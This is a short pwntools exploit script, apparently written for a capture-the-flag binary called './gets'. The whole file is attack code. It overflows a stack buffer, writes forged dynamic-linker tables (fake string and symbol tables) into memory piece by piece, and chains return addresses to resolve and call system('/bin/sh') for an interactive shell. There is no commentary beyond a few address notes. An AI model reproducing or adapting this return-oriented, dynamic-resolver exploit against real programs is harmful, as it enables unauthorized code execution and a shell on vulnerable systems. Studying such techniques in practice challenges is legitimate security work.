#!/usr/bin/python
# -*- coding: <encoding name> -*-

from pwn import *
import time,sys,binascii

elf_name = "./gets"
elf = ELF(elf_name)
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

io = process( elf_name )
gdb.attach(io, "b *0x40043E")

pop_rdi_ret = 0x0000000000400593
plt_0 = 0x00000000004003d0  #objdump -d -j .plt bof
rel_plt = 0x400398 # objdump -s -j .rel.plt bof

def writeData(dest, data):
    payload = 'a' * 16
    payload += p64(dest + 0x10)
    payload += p64(0x400505)
    payload += data.ljust(16, '\x00')
    payload += p64(0x600f00)
    payload += p64(0x400505)
    io.send(payload)

def exp():
    buf_base = 0x600c00
    buf = p64(pop_rdi_ret)
    buf += p64(buf_base + 0x28)
    buf += p64(plt_0)
    buf += p64(0)
    buf += "system".ljust(8, '\x00')
    buf += "/bin/sh\x00"

    dynamic_addr = 0x6006f8

    buf2_base = dynamic_addr + 8 * 0x10a
    buf2 = p64(5)  # DT_STRTAB
    buf2 += p64(buf_base + 0x20)  # fake strtab address
    buf2 += p64(6)  # DT_SYMTAB
    buf2 += p64(0x600f00)

    for i in range(0, len(buf), 16):
        writeData(buf_base + i, buf[i:i + 16])
    for i in range(0, len(buf2), 16):
        writeData(buf2_base + i, buf2[i:i + 16])

    io.send('\x90' * 16 + p64(buf_base - 8) + p64(0x400520))
    io.interactive()

exp()
